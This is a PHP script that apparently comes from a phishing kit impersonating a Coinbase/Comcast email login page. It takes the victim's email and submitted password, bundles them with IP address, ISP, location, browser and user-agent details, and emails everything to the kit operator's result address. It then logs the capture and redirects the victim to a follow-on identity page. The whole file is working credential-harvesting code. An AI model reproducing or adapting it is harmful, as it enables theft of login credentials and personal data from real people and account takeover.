<?php
session_start();

error_reporting(0);
session_start();
require_once '../../../main.php';


if(isset($_POST['submit'])) {
    
    $email    = $_SESSION['email'];
    $password = $_POST['password'];
    $message = "#---------------------[ G-SPOT. Inc ]-------------------------#
                #---------------------[ EMAIL LOGIN ]-------------------------#
                Email           : ".$email."
                Password        : ".$password."
                #-------------------[ DEVICE INFORMATION ]--------------------#
                IP Address  : ".$ip."
                ISP		    : ".$ispuser."
                Region		: ".$regioncity."
                City		: ".$citykota."
                GMT         : ".$continent."
                Timezone	: ".$timezone."
                OS/Browser	: ".$os." / ".$br."
                Date		: ".$date."
                User Agent	: ".$user_agent."
                #----------------[ きみ の こと が すき だから ]----------------#";
                $from = $setting['sender_mail'];
                $to = $setting['email_result'];
                $headers = "From: G-SPOT COINBASE <".$from.">";
                $subject = "[G-SPOT] - Coinbase COMCAST Tembus Email [$cn - $os - $ip]";
    mail($to, $subject, $message, $headers);

tulis_file("../../../result/activity.txt","$time : $countryname | $ip | LOGIN EMAIL");
tulis_file("../../../result/total_email.txt","$ip");
echo "<script type='text/javascript'>window.top.location='../../../login/identity.php';</script>";
}